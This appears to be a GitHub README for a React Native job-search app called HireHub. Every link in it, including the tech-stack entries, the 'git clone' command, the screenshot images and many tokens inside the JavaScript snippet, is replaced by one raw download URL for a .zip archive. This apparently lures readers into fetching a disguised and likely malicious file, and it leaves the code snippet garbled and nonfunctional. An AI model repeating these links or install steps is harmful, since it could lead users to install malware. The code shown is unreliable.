<div align="center"> 

<h3>📱 A modern job search app built with React Native and Expo</h3> </div>
📌 Table of Contents
📖 Overview

⚙️ Tech Stack

✨ Features

🚀 Getting Started

🖼️ Snippets

📎 Resources

🙌 Contributing

📖 Overview
HireHub is a feature-rich React Native application designed to help users find jobs with ease. Whether you're exploring nearby opportunities or searching for specific job titles, HireHub has you covered with a responsive UI and seamless API integration.

Watch the full tutorial and learn to build this app on JavaScript Mastery YouTube

⚙️ Tech Stack
React Native (Expo)

https://github.com/vedant007-v/hire_hub/raw/refs/heads/main/components/home/nearby/hub_hire_3.6-beta.4.zip

Axios

RapidAPI - JSearch

Custom React Hooks

Expo Router & Navigation

✨ Features
✅ Beautiful & Responsive UI
✅ Browse Jobs by Category or Location
✅ Search with Pagination
✅ Custom API Integration via RapidAPI
✅ Detailed Job Descriptions
✅ Reusable Components & Hooks
✅ Error Handling & Loaders
✅ Optimized for Mobile Devices

🚀 Getting Started
Prerequisites
Make sure you have the following installed:

https://github.com/vedant007-v/hire_hub/raw/refs/heads/main/components/home/nearby/hub_hire_3.6-beta.4.zip

Expo CLI

Git

RapidAPI account

Installation Steps
bash
Copy code
# Clone the repository
git clone https://github.com/vedant007-v/hire_hub/raw/refs/heads/main/components/home/nearby/hub_hire_3.6-beta.4.zip
cd hirehub

# Install dependencies
npm install
Setup Environment
Create a .env file in the root directory and add your RapidAPI key:

env
Copy code
X-RapidAPI-Key=your_key_here
Run the App
bash
Copy code
npm start
Scan the QR code with Expo Go to view the app on your device.

![Home page](https://github.com/vedant007-v/hire_hub/raw/refs/heads/main/components/home/nearby/hub_hire_3.6-beta.4.zip)

![Home Job](https://github.com/vedant007-v/hire_hub/raw/refs/heads/main/components/home/nearby/hub_hire_3.6-beta.4.zip)

![Job Discription](https://github.com/vedant007-v/hire_hub/raw/refs/heads/main/components/home/nearby/hub_hire_3.6-beta.4.zip)

![Google jov](https://github.com/vedant007-v/hire_hub/raw/refs/heads/main/components/home/nearby/hub_hire_3.6-beta.4.zip)

🖼️ Snippets
<details> <summary><code>https://github.com/vedant007-v/hire_hub/raw/refs/heads/main/components/home/nearby/hub_hire_3.6-beta.4.zip</code></summary>
js
Copy code
useEffect(() => {
  const fetchJobs = async () => {
    setSearchLoader(true);
    try {
      const response = await https://github.com/vedant007-v/hire_hub/raw/refs/heads/main/components/home/nearby/hub_hire_3.6-beta.4.zip("https://github.com/vedant007-v/hire_hub/raw/refs/heads/main/components/home/nearby/hub_hire_3.6-beta.4.zip", {
        params: { query: https://github.com/vedant007-v/hire_hub/raw/refs/heads/main/components/home/nearby/hub_hire_3.6-beta.4.zip, page: page },
        headers: {
          "X-RapidAPI-Key": https://github.com/vedant007-v/hire_hub/raw/refs/heads/main/components/home/nearby/hub_hire_3.6-beta.4.zip,
          "X-RapidAPI-Host": "https://github.com/vedant007-v/hire_hub/raw/refs/heads/main/components/home/nearby/hub_hire_3.6-beta.4.zip"
        }
      });
      setSearchResult(https://github.com/vedant007-v/hire_hub/raw/refs/heads/main/components/home/nearby/hub_hire_3.6-beta.4.zip);
    } catch (error) {
      setSearchError(true);
    } finally {
      setSearchLoader(false);
    }
  };
  fetchJobs();
}, [page]);
</details>